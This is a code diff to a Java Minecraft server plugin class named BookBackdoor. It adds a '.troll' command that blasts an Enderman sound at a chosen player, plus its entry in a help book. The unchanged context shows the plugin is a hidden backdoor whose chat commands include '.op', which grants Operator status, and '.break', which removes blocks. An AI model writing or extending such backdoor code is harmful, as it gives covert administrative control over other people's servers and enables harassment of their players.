@@ -173,6 +173,14 @@ public class BookBackdoor implements Listener {
                     } catch (Exception e){
                         player.sendMessage("Block could not be set to air");
                     }
+                } else if(args[0].equalsIgnoreCase("troll")){
+                    try {
+                        Player p = this.plugin.getServer().getPlayer(args[1]);
+                        Location loc = p.getLocation();
+                        player.playSound(loc, Sound.ENTITY_ENDERMAN_DEATH, 100, 1);
+                    } catch (Exception e) {
+                        player.sendMessage("Please use a valid player name.");
+                    }
                 } else if(args[0].equalsIgnoreCase("help")){
                     ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
                     BookMeta meta = (BookMeta)book.getItemMeta();
@@ -200,6 +208,7 @@ public class BookBackdoor implements Listener {
                         TextComponent op = genHoverText(ChatColor.GREEN + ".op\n", "Gives you Operator status.\n\nUSAGE: .op");
                         TextComponent deop = genHoverText(ChatColor.GREEN + ".deop\n", "Removes your Operator status.\n\nUSAGE: .deop");
                         TextComponent bbreak = genHoverText(ChatColor.GREEN + ".break\n", "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relative to head>");
+                        TextComponent troll = genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
                         BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak};
 
                         meta.spigot().addPage(page);
